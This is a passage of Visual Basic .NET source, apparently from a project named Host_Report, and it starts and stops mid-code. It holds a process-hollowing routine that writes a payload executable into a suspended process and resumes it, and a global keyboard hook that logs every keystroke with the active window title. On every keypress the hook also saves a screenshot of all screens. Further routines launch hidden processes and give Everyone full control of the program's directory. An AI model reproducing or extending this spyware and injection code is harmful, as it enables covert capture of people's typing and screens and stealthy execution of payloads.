            Dim PayloadIs64 As Boolean = False
            Dim dwPEHeaderAddress As Integer = BitConverter.ToInt32(payload, &H3C) 'COMMENT: Gets the PEHeader start address
            Dim dwNetDirFlags As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H398) 'COMMENT: Gets the .NET Header Flags value to determine if its a AnyCPU Compiled exe or not
            Dim wMachine As Integer = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H4) 'COMMENT: Gets the reads the Machine value
            If wMachine = 8664 Then : PayloadIs64 = True 'Checks the Machine value to know if payload is 64bit or not"
            Else : PayloadIs64 = False : End If
            If PayloadIs64 = False Then
                If dwNetDirFlags = &H3 Then 'To make sure we don't rewrite flags on a Payload which is already AnyCPU Compiled, it will only slow us down
                    Buffer.SetByte(payload, dwPEHeaderAddress + &H398, &H1) 'Replaces the .NET Header Flag on a 32bit compiled payload, to make it possible doing 32bit -> 64bit injection
                End If
            End If
            Dim dwImageBase As Integer
            If PayloadIs64 = True Then
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H30) 'Reads the ImageBase value of a 64bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual addressstart location for our exe in its own memory space
            Else
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H34) 'Reads the ImageBase value of a 32bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual address start location for our exe in its own memory space
            End If
            If dwImageBase = BaseAddress Then 'COMMENT: If the BaseAddress of our Exe is matching the ImageBase, it's because it's mapped and we have to unmap it
                If Not NtUnmapViewOfSection(PI.hProcess, BaseAddress) = 0 Then Throw New Exception() 'COMMENT: Unmapping it
            End If
            Dim dwSizeOfImage As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H50)
            Dim dwNewImageBase As Integer = VirtualAllocEx(PI.hProcess, dwImageBase, dwSizeOfImage, &H3000, &H40) 'COMMENT: Makes the process ready to write in by specifying how much space we need to do it and where we need it
            If dwNewImageBase = 0 Then Throw New Exception()
            Dim dwSizeOfHeaders As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H54)
            If Not WriteProcessMemory(PI.hProcess, dwNewImageBase, payload, dwSizeOfHeaders, ReadWrite) Then Throw New Exception() 'Writes the size of the payloads PE header to the target
            'COMMENT: This is here where most of the magic happens. We write in all our sections data, which contains our resssources, code and the information to utilize the sections: VirtualAddress, SizeOfRawData and PointerToRawData
            Dim SizeOfOptionalHeader As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H14)
            Dim SectionOffset As Integer = dwPEHeaderAddress + (&H16 + SizeOfOptionalHeader + &H2)
            Dim NumberOfSections As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H6)
            For I As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(payload, SectionOffset + &HC)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H10)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H14)
                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(payload, PointerToRawData, SectionData, 0, SectionData.Length)
                    If Not WriteProcessMemory(PI.hProcess, dwNewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If
                SectionOffset += &H28
            Next
            Dim PointerData As Byte() = BitConverter.GetBytes(dwNewImageBase)
            If TargetIs64 = True Then
                If Not WriteProcessMemory(PI.hProcess, PEBAddress64 + &H10, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new etrypoint for 64bit target
            Else
                If Not WriteProcessMemory(PI.hProcess, PEBAddress32 + &H8, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new entrypoint for 32bit target
            End If
            If ResumeThread(PI.hThread) = -1 Then Throw New Exception() 'Resumes the suspended target with all its new exciting data
        Catch ex As Exception
            Dim P As Process = Process.GetProcessById(PI.dwProcessId)
            If P IsNot Nothing Then P.Kill()
            Return False
        End Try
        Return True
    End Function

#End Region

#Region "Global Keyboard Hook Injection"

    Private Shared Function SetHook(proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                    proc,
                                    GetModuleHandle(curProcess.ProcessName & ".exe"),
                                    0)
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                    proc,
                                    GetModuleHandle(curProcess.ProcessName),
                                    0)
        End Using
    End Function

    Private Shared Function HookCallback(nCode As Integer,
                                        wParam As IntPtr,
                                        lParam As IntPtr) As IntPtr
        If nCode >= 0 _
           AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim capsLock As Boolean = (GetKeyState(&H14) And &HFFFF) <> 0
            Dim shiftPress As Boolean = (GetKeyState(&HA0) And &H8000) <> 0 OrElse (GetKeyState(&HA1) And &H8000) <> 0
            Dim currentKey As String = KeyboardLayout(Marshal.ReadInt32(lParam))
            If capsLock OrElse shiftPress Then
                currentKey = currentKey.ToUpper()
                'Added
                Dim userName As String = Environment.UserName
                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                               Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                Dim gfx As Graphics = Graphics.FromImage(bmp)
                ' This line is modified to take everything based on the size of the bitmap
                gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                   SystemInformation.VirtualScreen.Y,
                                   0,
                                   0,
                                   SystemInformation.VirtualScreen.Size)
                ' Oh, create the directory if it doesn't exist
                Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                bmp.Save(captureSavePath)

            Else
                currentKey = currentKey.ToLower()
                'Added
                Dim userName As String = Environment.UserName
                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                               Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                Dim gfx As Graphics = Graphics.FromImage(bmp)
                ' This line is modified to take everything based on the size of the bitmap
                gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                   SystemInformation.VirtualScreen.Y,
                                   0,
                                   0,
                                   SystemInformation.VirtualScreen.Size)
                ' Oh, create the directory if it doesn't exist
                Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                bmp.Save(captureSavePath)

            End If
            If CType(Marshal.ReadInt32(lParam), Keys) >= Keys.F1 _
               AndAlso CType(Marshal.ReadInt32(lParam), Keys) <= Keys.F24 Then
                currentKey = $"[{CType(Marshal.ReadInt32(lParam), Keys)}]"
                'Added
                Dim userName As String = Environment.UserName
                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                               Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                Dim gfx As Graphics = Graphics.FromImage(bmp)
                ' This line is modified to take everything based on the size of the bitmap
                gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                   SystemInformation.VirtualScreen.Y,
                                   0,
                                   0,
                                   SystemInformation.VirtualScreen.Size)
                ' Oh, create the directory if it doesn't exist
                Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                bmp.Save(captureSavePath)

            Else
                Select Case (CType(Marshal.ReadInt32(lParam), Keys)).ToString()
                    Case "Space"
                        currentKey = "[SPACE]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "Return"
                        currentKey = "[ENTER]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "Escape"
                        currentKey = "[ESC]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "LControlKey"
                        currentKey = "[CTRL]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "RControlKey"
                        currentKey = "[CTRL]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "RShiftKey"
                        currentKey = "[Shift]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "LShiftKey"
                        currentKey = "[Shift]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "Back"
                        currentKey = "[Back]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "LWin"
                        currentKey = "[WIN]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "Tab"
                        currentKey = "[Tab]"
                        'Added
                        Dim userName As String = Environment.UserName
                        Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                        Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                        ' This line is modified for multiple screens, also takes into account different screen size (if any)
                        Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                       Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                        Dim gfx As Graphics = Graphics.FromImage(bmp)
                        ' This line is modified to take everything based on the size of the bitmap
                        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                           SystemInformation.VirtualScreen.Y,
                                           0,
                                           0,
                                           SystemInformation.VirtualScreen.Size)
                        ' Oh, create the directory if it doesn't exist
                        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                        bmp.Save(captureSavePath)

                    Case "Capital"
                        Select Case capsLock
                            Case True
                                currentKey = "[CAPSLOCK: OFF]"
                                'Added
                                Dim userName As String = Environment.UserName
                                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                                Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                                Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                                Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                               Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                                Dim gfx As Graphics = Graphics.FromImage(bmp)
                                ' This line is modified to take everything based on the size of the bitmap
                                gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                                   SystemInformation.VirtualScreen.Y,
                                                   0,
                                                   0,
                                                   SystemInformation.VirtualScreen.Size)
                                ' Oh, create the directory if it doesn't exist
                                Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                                bmp.Save(captureSavePath)

                            Case Else
                                currentKey = "[CAPSLOCK: ON]"
                                'Added
                                Dim userName As String = Environment.UserName
                                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                                Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                                Dim captureSavePath As String = $"{savePath }\Host_Report\{userName }\capture_{dateString }.png"
                                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                                Dim bmp As New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                                               Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                                Dim gfx As Graphics = Graphics.FromImage(bmp)
                                ' This line is modified to take everything based on the size of the bitmap
                                gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                                   SystemInformation.VirtualScreen.Y,
                                                   0,
                                                   0,
                                                   SystemInformation.VirtualScreen.Size)
                                ' Oh, create the directory if it doesn't exist
                                Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                                bmp.Save(captureSavePath)

                        End Select
                End Select
            End If
            On Error GoTo Err
            'NOTE: YOU MUST USE THE EXACT METHOD TO GET CURRENT USERS DOCUMENTS.
            'I TRIED ENVIRONMENT.GETFOLDERPATH(ENVIRONMENT.SPECIALDIRECTORIES.MYDOCUMENTS)
            'MY.COMPUTER...BLAH BLAH BLAH COMBINE PATH...NONE OF IT WORKED ODDLY, FYI. I MAY BE THE "USING CALL BELOW"
            'THE DIRECTORY FOLDER CAN BE CHANGED TO WHATEVER, DESKTOP, PICTURES...ETC.
            Dim fileName As String = $"{Environ("USERPROFILE")}\Documents\Host_Report\Host_Report.txt"

            ' Dim fileName As String = "C:\Users\rytho\Documents\Host_Report\Host_Report.txt"
            Using writer As New StreamWriter(fileName,
                                             True)
                If CurrentActiveWindowTitle _
                   = GetActiveWindowTitle() Then
                    writer.Write($"{vbCrLf}Host_Report Log Entry:")
                    writer.Write(currentKey)
                Else
                    writer.WriteLine($"{$"{vbNewLine}{vbNewLine}{Date.Now.ToLongTimeString()}"} {Date.Now.ToLongDateString()}")
                    writer.WriteLine($"  :{currentKey}")
                    writer.WriteLine(vbCrLf & "-------------------------------")
                    writer.Write(currentKey)
                End If
            End Using
        End If
        Return CallNextHookEx(_hookID,
                              nCode,
                              wParam,
                              lParam)
Err:
    End Function

    Private Shared Function KeyboardLayout(vkCode As UInteger) As String
        Dim processId As UInteger = Nothing
        Try
            Dim sb As New StringBuilder()
            Dim vkBuffer As Byte() = New Byte(255) {}
            If Not GetKeyboardState(vkBuffer) Then Return ""
            Dim scanCode As UInteger = MapVirtualKey(vkCode, 0)
            ToUnicodeEx(vkCode,
                        scanCode,
                        vkBuffer,
                        sb,
                        5,
                        0,
                        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), processId)))
            Return sb.ToString()
        Catch
        End Try
        Return (CType(vkCode, Keys)).ToString()
    End Function

    'GetActiveWindowTitle: Retrieves the window handle to the active window attached to the calling thread's message.
    Private Shared Function GetActiveWindowTitle() As String
        Dim pid As UInteger = Nothing
        Try
            'Retrieves a handle to the foreground window (the window with which the user is currently working).
            'The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
            Dim hwnd As IntPtr = GetForegroundWindow()
            GetWindowThreadProcessId(hwnd,
                                     pid)
            Dim p As Process = Process.GetProcessById(pid) 'Every process has an ID # (pid)
            Dim title As String = p.MainWindowTitle
            'IsNullOrWhiteSpace is a convenience method that is similar to the following code,
            'except that it offers superior performance:
            If String.IsNullOrWhiteSpace(title) Then title = p.ProcessName
            CurrentActiveWindowTitle = title
            Return title
        Catch __unusedException1__ As Exception
            Return "???"
        End Try
    End Function

    'https://learn.microsoft.com/en-us/powershell/module/dism/get-windowsimage?view=windowsserver2022-ps
    Function GetWindowImage(WindowHandle As IntPtr,
    Area As Rectangle) As Bitmap
        Using b As New Bitmap(Area.Width, Area.Height, Imaging.PixelFormat.Format24bppRgb)
            Using img As Graphics = Graphics.FromImage(b)
                Dim ImageHDC As IntPtr = img.GetHdc
                Using window As Graphics = Graphics.FromHwnd(WindowHandle)
                    Dim WindowHDC As IntPtr = window.GetHdc
                    BitBlt(ImageHDC,
                           0,
                           0,
                           Area.Width,
                           Area.Height,
                           WindowHDC,
                           Area.X,
                           Area.Y,
                           CopyPixelOperation.SourceCopy)
                    window.ReleaseHdc()
                End Using
                img.ReleaseHdc()
            End Using
            Return b
        End Using
    End Function

    Private Sub HOST_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        'Cancel Form Closing
        'If e.CloseReason = CloseReason.UserClosing Then e.Cancel = True
    End Sub
#End Region

#Region "Ram GB Collection"
    Sub ReleaseRAM()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If Environment.OSVersion.Platform = PlatformID.Win32NT Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            End If
        Catch ex As Exception
            MsgBox(ex.ToString())
        End Try
    End Sub

#End Region

#Region "Grant Directory Access | Grant Assembly Access"

    Public Shared Function IsReadable([me] As DirectoryInfo) As Boolean
        Dim rules As AuthorizationRuleCollection
        Dim identity As WindowsIdentity
        Try
            rules = [me].GetAccessControl().GetAccessRules(True,
                                                           True,
                                                           GetType(SecurityIdentifier))
            identity = WindowsIdentity.GetCurrent()
        Catch ex As Exception
            Return False
        End Try
        Dim isAllow As Boolean = False
        Dim userSID As String = identity.User.Value
        For Each rule As FileSystemAccessRule In rules
            If rule.IdentityReference.ToString() = userSID _
                    OrElse identity.Groups.Contains(rule.IdentityReference) Then
                If (rule.FileSystemRights.HasFlag(FileSystemRights.Read) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadAndExecute) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadAttributes) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadData) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadExtendedAttributes) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadPermissions)) AndAlso rule.AccessControlType = AccessControlType.Deny Then
                    Return False
                ElseIf (rule.FileSystemRights.HasFlag(FileSystemRights.Read) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadAndExecute) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadAttributes) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadData) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadExtendedAttributes) _
                        OrElse rule.FileSystemRights.HasFlag(FileSystemRights.ReadPermissions)) AndAlso rule.AccessControlType = AccessControlType.Allow Then
                    isAllow = True
                End If
            End If
        Next

        Return isAllow
    End Function

    <DebuggerStepThrough>
    Public Function DirectoryHasRights(directoryPath As String,
    rights As FileSystemRights,
    accessControlType As AccessControlType) As Boolean

        Dim acl As AuthorizationRuleCollection =
        New DirectoryInfo(directoryPath).GetAccessControl().GetAccessRules(True, True, GetType(SecurityIdentifier))

        Return InternalHasRights(acl, rights, accessControlType)

    End Function

    <DebuggerStepThrough>
    Private Function InternalHasRights(acl As AuthorizationRuleCollection,
    rights As FileSystemRights,
    access As AccessControlType) As Boolean

        Dim winId As WindowsIdentity = WindowsIdentity.GetCurrent
        Dim winPl As New WindowsPrincipal(winId)
        Dim allow As Boolean = False
        Dim inheritedAllow As Boolean = False
        Dim inheritedDeny As Boolean = False
        For Each rule As FileSystemAccessRule In acl
            ' If the current rule applies to the current user then...
            If winId.User.Equals(rule.IdentityReference) OrElse
           winPl.IsInRole(DirectCast(rule.IdentityReference, SecurityIdentifier)) Then
                If rule.AccessControlType.Equals(AccessControlType.Deny) AndAlso
               ((rule.FileSystemRights And rights) _
               = rights) Then
                    If rule.IsInherited Then
                        inheritedDeny = True
                    Else
                        ' Non inherited "deny" rule takes overall precedence.
                        If access = AccessControlType.Deny Then
                            Return True
                        Else
                            Return False
                        End If
                    End If
                ElseIf rule.AccessControlType.Equals(AccessControlType.Allow) AndAlso
                   ((rule.FileSystemRights _
                   And rights) = rights) Then
                    If rule.IsInherited Then
                        inheritedAllow = True
                    Else
                        allow = True
                    End If
                End If
            End If
        Next rule
        If allow _
                AndAlso (access = AccessControlType.Allow) Then
            ' Non inherited "allow" takes precedence over inherited rules.
            Return True

        ElseIf inheritedAllow _
                AndAlso Not inheritedDeny _
                AndAlso (access = AccessControlType.Allow) Then
            Return True
        Else
            Return inheritedDeny _
                AndAlso Not inheritedAllow
        End If
    End Function

    'Assembly Access Control
    Sub GrantAccess()
        Dim dInfo As New DirectoryInfo(Reflection.Assembly.GetExecutingAssembly.Location)
        Dim dSecurity As DirectorySecurity = dInfo.GetAccessControl()
        dSecurity.AddAccessRule(New FileSystemAccessRule(New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing),
                                                         FileSystemRights.FullControl,
                                                         InheritanceFlags.ObjectInherit Or InheritanceFlags.ContainerInherit,
                                                         PropagationFlags.NoPropagateInherit, AccessControlType.Allow))
        dInfo.SetAccessControl(dSecurity)
    End Sub



    'You can use SyncLock to force your threads to wait. Class level so all threads access same lock
    'Then use syncLock when you start your process and end it when you are done.
    Friend Sub HiddenProcess1()
        SyncLock myLock
            Dim _File As String = "C:\windows\system32\notepad.exe"
            Dim _Process As New Process()
            _Process.StartInfo.FileName = _File
            _Process.Start()
            ShowWindow(_Process.MainWindowHandle, ShowWindowType.Hide)
        End SyncLock

    End Sub

    Friend Sub HiddenProcess2()
        SyncLock myLock
            Dim _File As String = "C:\windows\system32\notepad.exe"
            Dim _Process As New Process()
            _Process.StartInfo.FileName = _File
            _Process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            _Process.Start()
        End SyncLock
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
        Timer2.Start()

        Dim fs = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen1.wav", FileMode.Open)
        Dim fs2 = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen2game.wav", FileMode.Open)

        Dim reader = New WaveFileReader(fs)
        Dim reader2 = New WaveFileReader(fs2)
        Dim sample1 = reader.ToSampleProvider()
        Dim sample2 = reader2.ToSampleProvider()
        Dim sample3 = New ISampleProvider() {sample1, sample2}
        Dim conc = New ConcatenatingSampleProvider(sample3)
        WaveFileWriter.CreateWaveFile16(
